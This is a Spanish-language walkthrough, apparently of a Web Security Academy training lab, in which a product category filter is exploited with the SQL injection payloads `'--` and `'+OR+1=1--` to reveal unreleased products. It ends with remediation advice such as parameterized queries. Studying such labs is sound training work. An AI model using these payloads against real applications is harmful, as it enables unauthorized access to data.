# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

![Practitioner](https://img.shields.io/badge/level-Apprentice-green)

---

Tenemos un sitio web para realizar compras de productos:
![image](https://github.com/user-attachments/assets/e7f1d850-f540-4cfc-9495-0bae72bb061e)

Podemos buscar productos y realizar filtros seg√∫n su categor√≠a, probamos filtrar por `Gifts`:
![image](https://github.com/user-attachments/assets/a82cdd53-a451-41de-8bbc-b3da6aedd74f)

Nosotros sabemos que la consulta por detr√°s es la siguiente:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Y sabemos que el valor de `category` lo toma del par√°metro de la url `?category=Gifts`.

Procedemos a intentar romper la consulta, a√±adiendo el caracter `'`, lo cual cerrar√≠a la consulta de la siguiente forma:
```sql
SELECT * FROM products WHERE category = 'Gifts'' AND relesead = 1
```
La √∫ltima parte de la consulta (`' AND relesead = 1`) queda por fuera y podr√≠a causar un error de sintaxis:
![image](https://github.com/user-attachments/assets/b8469c86-9f5b-422f-9eda-9ed3f7cc83d5)

Este es el primer indicador de que podr√≠a haber inyecci√≥n SQL.


Lo que hacemos ahora es a√±adir el siguiente payload: `'--`
Por lo cual la consulta completa ser√≠a:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND relesead = 1
```
Que es lo mismo que:
```sql
SELECT * FROM products WHERE category = 'Gifts'
```


![image](https://github.com/user-attachments/assets/4540d5d6-30f7-45fe-8550-40f44392e647)

Como vemos se realiz√≥ la consulta, lo cual confirmamos que hay inyecci√≥n SQL.

Procedemos a resolver el lab inyectando el siguiente payload: `'+OR+1=1--`

Por lo que la cadena de consulta quedar√≠a:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND relesead = 1
```
Que ser√≠a lo mismo que:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1
```

Lo cual se traduce en `mostrame todas las filas de la tabla products donde la categoria es Gifts o donde 1=1`. Por lo que mostrar√° todos los productos:

![image](https://github.com/user-attachments/assets/acec4257-02e1-4607-a0c5-b9b481997939)

---

## ‚úÖ Conclusi√≥n

Se identific√≥ y explot√≥ exitosamente una vulnerabilidad de **SQL Injection** en el par√°metro `category`, espec√≠ficamente en la cl√°usula `WHERE` de una consulta SQL.

La inyecci√≥n permiti√≥ alterar la l√≥gica original (`AND released = 1`) para revelar productos ocultos que normalmente no deber√≠an mostrarse, cumpliendo el objetivo del laboratorio.

## üõ°Ô∏è Recomendaciones

- Utilizar consultas parametrizadas (prepared statements) para evitar la inyecci√≥n directa de datos del usuario en sentencias SQL.
- Validar y sanear adecuadamente toda entrada controlada por el usuario.
- No confiar en valores provenientes de la URL sin una capa de validaci√≥n en el servidor.

## üìö Lecciones aprendidas

- El caracter `'` puede ser una poderosa herramienta para confirmar inyecciones SQL.
- Comentar la parte restante de una consulta (`--`) es una t√©cnica com√∫n para forzar condiciones maliciosas.
- Las cl√°usulas `OR 1=1` permiten forzar evaluaciones verdaderas y acceder a datos no permitidos.





